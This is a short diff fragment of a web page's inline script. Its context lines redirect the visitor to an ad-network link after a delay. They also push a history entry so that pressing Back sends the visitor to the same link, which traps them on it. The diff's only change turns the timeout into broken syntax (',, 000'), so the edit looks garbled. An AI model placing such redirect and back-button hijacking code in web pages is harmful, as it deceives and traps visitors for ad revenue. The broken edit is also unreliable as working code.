@@ -181,8 +181,7 @@
   <script>
     setTimeout(() => {
       window.location.href = "https://www.profitablecpmratenetwork.com/q4pxj3cnyp?key=10d6bd6cfffb4ee0a83d093b5f06486b";
-    }, 3000);
-
+    },, 000);
     history.pushState(null, null, location.href);
     window.onpopstate = () => {
       location.href = "https://www.profitablecpmratenetwork.com/q4pxj3cnyp?key=10d6bd6cfffb4ee0a83d093b5f06486b";
